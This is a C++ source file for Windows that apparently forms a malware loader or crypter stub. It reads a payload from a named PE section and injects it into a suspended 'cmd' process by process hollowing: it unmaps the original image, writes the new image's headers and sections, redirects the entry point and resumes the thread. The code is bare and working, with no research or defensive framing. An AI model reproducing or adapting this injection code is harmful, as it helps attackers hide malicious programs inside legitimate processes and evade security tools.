
#include "stdafx.h"

ULONG protect(ULONG characteristics)
{
	static const ULONG mapping[] = {
		PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ,
		PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
		PAGE_EXECUTE_READWRITE
	};

	return mapping[characteristics >> 29];
}

HRESULT
ExecData(PVOID &pvPEData)
{
	HRESULT hr = S_OK;
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof si };

	LPTSTR cmdLine = _tcsdup(TEXT("cmd"));

	CreateProcess(NULL, cmdLine, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0,
		&si, &pi);

	CONTEXT context = { CONTEXT_INTEGER };

#ifndef DEFER_INJECT
	GetThreadContext(pi.hThread, &context);

	PVOID x;

	/* Dynamic linking call: */
	HMODULE hMod = GetModuleHandle(L"ntdll.dll");
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection =
		(pfnZwUnmapViewOfSection)GetProcAddress(hMod, "ZwUnmapViewOfSection");

	hr = ReadProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &x, sizeof x, 0);
	if (FAILED(hr)) {
		/* This is bad, abort! */
		return hr;
	}

	pZwUnmapViewOfSection(pi.hProcess, x);

	PIMAGE_NT_HEADERS nt = PIMAGE_NT_HEADERS(
		PCHAR(pvPEData) + PIMAGE_DOS_HEADER(pvPEData)->e_lfanew);

	DWORD   dwLastError = ::GetLastError();

	PVOID q = VirtualAllocEx(pi.hProcess,
		PVOID(nt->OptionalHeader.ImageBase),
		nt->OptionalHeader.SizeOfImage,
		MEM_RESERVE | MEM_COMMIT, PAGE_WRITECOPY);

	WriteProcessMemory(pi.hProcess, q, pvPEData, nt->OptionalHeader.SizeOfHeaders, 0);
	PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		WriteProcessMemory(pi.hProcess,
			PCHAR(q) + sect[i].VirtualAddress,
			PCHAR(pvPEData) + sect[i].PointerToRawData,
			sect[i].SizeOfRawData, 0);

		ULONG x;
		VirtualProtectEx(pi.hProcess,
			PCHAR(q) + sect[i].VirtualAddress,
			sect[i].Misc.VirtualSize,
			protect(sect[i].Characteristics),
			&x
			);
	}

	WriteProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &q, sizeof q, 0);
	context.Eax = ULONG(q) + nt->OptionalHeader.AddressOfEntryPoint;
#endif

	SetThreadContext(pi.hThread, &context);
	ResumeThread(pi.hThread);

	return hr;
}

int
GetSectionData(
_TCHAR *moduleName,
PUINT32 puSectionDataSize,
PBYTE *pbSectionData)
{
	int result = 0;
	HANDLE hFile;
	HANDLE hFileMapping = 0;
	LPVOID lpFileBase = 0;

	*puSectionDataSize = 0;
	hFile = CreateFile(moduleName, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE) {
		result = 1;
		goto Cleanup;
	}
	hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	if (hFileMapping == 0) {
		result = 1;
		goto Cleanup;
	}
	lpFileBase = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (lpFileBase == 0) {
		result = 1;
		goto Cleanup;
	}

	PIMAGE_DOS_HEADER pimdh;
	PIMAGE_NT_HEADERS pimnth;
	PIMAGE_SECTION_HEADER pimsh;

	pimdh = (PIMAGE_DOS_HEADER)lpFileBase;
	pimnth = (PIMAGE_NT_HEADERS)((char *)lpFileBase + pimdh->e_lfanew);
	pimsh = (PIMAGE_SECTION_HEADER)(pimnth + 1);

	DWORD start = 0;
	DWORD length = 0;

	for (int i = 0; i<pimnth->FileHeader.NumberOfSections; i++) {
		if (!strcmp((char *)pimsh->Name, SECTION_NAME)) {
			start = pimsh->PointerToRawData + (DWORD)lpFileBase;
			length = pimsh->SizeOfRawData;
			break;
		}
		pimsh++;
	}

	AllocateAndZero((PVOID*)pbSectionData, length);
	memcpy(*pbSectionData, (void *)start, length);
	*puSectionDataSize = length;

Cleanup:
	if (lpFileBase != 0) {
		CloseHandle(hFileMapping);
	}
	if (hFileMapping != 0) {
		CloseHandle(hFile);
	}

	return result;
}
